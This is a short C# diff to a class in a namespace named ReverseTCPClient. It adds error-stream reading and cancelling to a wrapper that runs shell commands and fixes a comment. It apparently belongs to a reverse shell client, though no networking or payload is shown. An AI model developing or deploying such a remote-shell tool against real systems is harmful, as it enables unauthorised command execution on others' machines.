@@ -30,6 +30,7 @@ namespace ReverseTCPClient
             CommandInterface.Start();
             //Beginning event listeners
             CommandInterface.BeginOutputReadLine();
+            CommandInterface.BeginErrorReadLine();
         }
         /// <summary>
         /// Runs a given command in the application that is running.
@@ -41,13 +42,14 @@ namespace ReverseTCPClient
         }
 
         /// <summary>
-        /// Kill the running process. Can not be restarted. 
+        /// Kills the running process. Can not be restarted. 
         /// </summary>
         public void killCommandLine(string commandToClose = "exit")
         {
             runCommand(commandToClose);
             CommandInterface.WaitForExit();
             CommandInterface.CancelOutputRead();
+            CommandInterface.CancelErrorRead();
         }
 
     }
